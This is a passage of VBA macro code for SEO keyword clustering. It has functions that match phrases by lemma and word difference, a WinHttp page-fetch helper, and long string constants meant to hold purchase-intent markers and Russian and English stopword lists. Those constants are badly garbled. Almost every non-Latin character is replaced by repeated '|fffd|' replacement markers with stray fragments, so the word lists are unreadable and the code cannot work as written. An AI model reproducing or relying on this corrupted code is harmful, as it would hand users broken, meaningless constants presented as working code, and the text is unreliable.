    For i = LBound(arr) To UBound(arr)
        tmpstr = Lemmatize(byezstopslov(LCase(CStr(arr(i, 1)))))
        If isChild(tmpstr, lemma) And WordDiff(tmpstr, lemma) < temp And WordDiff(tmpstr, lemma) > 0 Then
            firstClosestBroadParent = CStr(arr(i, 1))
            temp = WordDiff(tmpstr, lemma)
        End If
    Next i
End Function
Private Function firstClosestBroadChild(txt As String, rng As Range) As String
Dim temp As Long, i As Long, arr(), lemma As String, tmpstr As String
lemma = Lemmatize(byezstopslov(txt))
temp = 10
firstClosestBroadChild = ""
arr = rng.Value2
    For i = LBound(arr) To UBound(arr)
        tmpstr = Lemmatize(byezstopslov(LCase(CStr(arr(i, 1)))))
        If isChild(lemma, tmpstr) And WordDiff(tmpstr, lemma) < temp And WordDiff(tmpstr, lemma) > 0 Then
            firstClosestBroadChild = CStr(arr(i, 1))
            temp = WordDiff(tmpstr, lemma)
        End If
    Next i
End Function
Private Function firstClosestPhrasalParent(txt As String, rng As Range) As String
Dim temp As Long, i As Long, arr()
temp = 10
firstClosestPhrasalParent = ""
arr = rng.Value2
    For i = LBound(arr) To UBound(arr)
        If InStr(1, " " & CStr(arr(i, 1)) & " ", " " & txt & " ") > 0 And WordDiff(CStr(arr(i, 1)), txt) < temp And WordDiff(CStr(arr(i, 1)), txt) > 0 Then
            firstClosestPhrasalParent = CStr(arr(i, 1))
            temp = WordDiff(CStr(arr(i, 1)), txt)
        End If
    Next i
End Function
Private Function markyerypokupki() As String
markyerypokupki = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd|\olx\|fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd|\|fffd||fffd||fffd|\|fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd|"
End Function
Private Function markyeryaryendy() As String
markyeryaryendy = "|fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function
Private Function markyeryotzyvov() As String
markyeryotzyvov = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function
Function GetHtml(url As String) As String
Set httpReq = CreateObject("WinHttp.WinHttprequest.5.1")
httpReq.Open "GET", url, False
httpReq.SetRequestHeader "Content-Type", "text/xml"
httpReq.setTimeouts -1, -1, -1, -1
httpReq.Send request
GetHtml = httpReq.responseText
End Function
Private Function stopwordsAll() As String
stopwordsAll = "a about all an and any are as at be but by can do for from have i if in is it my no not of on one or so that the there they this to was we what which will with would you |fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||73ebf| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " " & _
"|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||eebf| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & " " & _
"|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||eebf| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd| |73ebf| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||eebf| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|" & " " & _
"|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |b3ebf| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||73ebf| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||8ebf| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd|"
End Function
Function stopwords() As String
stopwords = "a about all alled alling alls am an and ands any anys are ares as at be been but buts by can cans could did didst do does dost doth for fors from froms had has hast hath have haves having i if in is it me my no noes not nots of on one ones or so that thats the them there theres they theys this to was we were what whats which will willed wills with withs would you yous |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd|" & " " & _
"|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & " " & _
"|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 